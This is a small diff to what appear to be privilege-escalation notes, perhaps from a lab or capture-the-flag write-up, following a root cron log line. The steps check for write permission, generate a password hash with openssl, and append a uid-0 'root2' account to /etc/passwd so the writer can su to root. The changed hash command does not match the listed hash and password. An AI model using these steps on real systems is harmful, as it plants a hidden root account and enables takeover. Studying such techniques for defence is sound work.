@@ -306,7 +306,7 @@ Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.
  1. check if users have write permission
  2. openssl passwd evil:
  $1$eWmYOQrX$UHeqHr4pKVFfx1rrFK05B1
- IozRIqhlxS7jo
+openssl passwd -1 -salt hack password123
  3. echo "root2:$1$eWmYOQrX$UHeqHr4pKVFfx1rrFK05B1:0:0:root:/root:/bin/bash" >> /etc/passwd
  4. su root2, enter passwd as evil
  ```
